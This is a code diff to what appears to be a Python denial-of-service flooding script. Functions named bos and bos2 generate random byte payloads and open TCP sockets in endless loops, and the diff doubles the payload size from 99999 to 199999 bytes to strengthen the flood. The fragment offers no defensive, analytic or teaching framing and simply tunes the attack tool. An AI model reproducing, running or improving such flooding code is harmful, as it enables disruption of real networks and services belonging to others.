@@ -13,7 +13,7 @@ threads_bos = int(input("Threads : "))
 
 os.system("clear")
 def bos():
-    boss = random._urandom(99999)
+    boss = random._urandom(199999)
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
@@ -27,7 +27,7 @@ def bos():
             print("wibu")
 
 def bos2():
-    boss = random._urandom(99999)
+    boss = random._urandom(199999)
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
